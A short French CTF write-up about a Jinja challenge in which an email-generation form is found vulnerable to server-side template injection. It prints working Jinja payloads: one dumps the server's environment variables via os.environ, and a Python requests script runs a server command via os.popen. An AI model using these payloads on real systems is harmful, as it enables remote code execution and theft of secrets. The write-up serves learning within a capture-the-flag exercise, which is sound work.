---
tags:
  - CTF
date: 2026-02-13T14:42
tasks:
  - 
parent files:
  - 
title: Jinja challenge
description: Jinja challenge in 0xFUN ctf
---

# Recherches

On se retrouve sur une page qui permet de générer des emails (ou un truc du genre).

![[Pasted image 20260213144240.png]]

![[Pasted image 20260213144252.png]]

On teste d'entrer `{{7*7}}@gmail.com` et on remarque que l'adresse email enregistrée est `49@gmail.com`. On a peut-être une piste.

On regarde notre cheatsheet et on se rend compte que c'est un indicateur de jinja, ce qui est confirmé par le nom du challenge.

En cherchant des payloads sur internet on trouve le suivant, qui nous donne bien quelque chose:
```
{{lipsum.__globals__.os.environ}}@a.a
```



# Correction

Au final il nous suffisait d'utiliser cette solution
Jinja writeup: [https://fayred.fr/en/writeups/heroctf-2024-jinjatic/](https://fayred.fr/en/writeups/heroctf-2024-jinjatic/ "https://fayred.fr/en/writeups/heroctf-2024-jinjatic/")

Donc la solution était
```
import requests
url = 'http://<url>'
payload = """{{cycler.__init__.__globals__.os.popen('../getflag').read()}}"""
r = requests.post(url, data={'email': f'"({payload})" <fayred@example.com>'})
print(r.text)
```